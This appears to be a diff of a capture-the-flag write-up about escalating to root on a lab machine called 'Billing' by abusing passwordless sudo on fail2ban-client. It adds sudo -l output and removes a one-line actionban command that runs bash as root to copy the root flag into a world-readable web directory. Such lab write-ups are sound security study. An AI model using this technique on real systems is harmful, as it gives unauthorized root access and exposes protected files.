@@ -48,23 +48,23 @@ After gaining access, I found the first flag in the `magnus` user's directory:
 
  ## 4. Privilege Escalation to Root via Fail2Ban
 
-I checked which commands I could run as sudo:
+I try to switch to the root user
 
 ```console
 sudo -l
 ```
 The output showed:
 ```
+Matching Defaults entries for asterisk on Billing:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+Runas and Command-specific defaults for asterisk:
+    Defaults!/usr/bin/fail2ban-client !requiretty
+
 User asterisk may run the following commands on Billing:
     (ALL) NOPASSWD: /usr/bin/fail2ban-client
 
-I found a way to escalate privileges through Fail2Ban:
-
-Source: juggernaut-sec.com
-
-I modified the Fail2Ban rule to copy the root flag to a directory accessible by the www-data user:
-
-sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /var/www/html/mbilling/lib/icepay/root_exposed.txt && chmod 777 /var/www/html/mbilling/lib/icepay/root_exposed.txt'"
 ```
 
 
